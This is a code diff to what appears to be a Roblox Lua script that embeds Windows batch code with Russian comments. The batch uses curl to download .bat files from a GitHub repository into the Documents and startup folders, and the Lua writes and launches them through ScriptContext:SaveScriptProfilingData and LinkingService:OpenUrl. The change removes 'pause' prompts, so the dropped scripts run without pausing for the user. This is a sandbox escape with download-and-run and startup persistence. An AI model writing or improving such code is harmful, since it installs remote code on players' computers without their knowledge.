@@ -10,7 +10,7 @@ curl -o "%docsPath%\batchUpdate.bat" https://raw.githubusercontent.com/goofyahh-
 
 :: Уведомление о завершении
 echo Файл batchUpdate.bat успешно сохранен в папку "Документы".
-pause
+
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
 task.wait(2)
@@ -26,7 +26,7 @@ curl -o "%startupPath%\Auto.bat" https://raw.githubusercontent.com/goofyahh-hub/
 
 :: Уведомление о завершении
 echo Файл Auto.bat успешно сохранён в папку автозагрузки.
-pause
+
 
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
@@ -48,7 +48,6 @@ for /r "%documentsPath%" %%F in ("%searchFile%*") do (
 )
 
 echo Файл не найден
-
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
